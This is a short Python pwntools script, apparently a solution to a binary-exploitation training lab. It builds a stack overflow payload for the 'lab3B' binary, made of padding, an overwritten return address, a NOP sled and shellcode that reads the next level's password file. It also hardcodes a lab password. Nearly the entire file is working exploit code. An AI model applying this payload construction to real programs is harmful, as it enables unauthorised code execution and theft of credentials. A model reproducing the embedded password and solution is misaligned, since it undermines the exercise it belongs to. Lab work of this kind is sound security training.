#!/usr/bin/env python
from pwn import *

chal = '3B'
password = "th3r3_iz_n0_4dm1ns_0n1y_U!"

host = 'exploit-vm'
user = 'lab%s' % chal
level, grade = int(chal[:-1]), chal[-1]
binary = '/levels/lab{:02d}/lab{}'.format(level, chal)

flag_file = "/home/lab3A/.pass"
shellcode = shellcraft.i386.linux.cat(flag_file)

# Shellcode works but not the code did not seem to work when launched by
# pwntools over SSH.
shellcode = "".join([
    "A"*156,  # Pad to RIP
    p32(0xbffff514+0x100),  # Set RIP inside the NOP sled
    "\x90" * 0x200,
    asm(shellcode),
])
log.success("Built exploit payload: "
            "python -c \"print %r\" | %s", shellcode, binary)
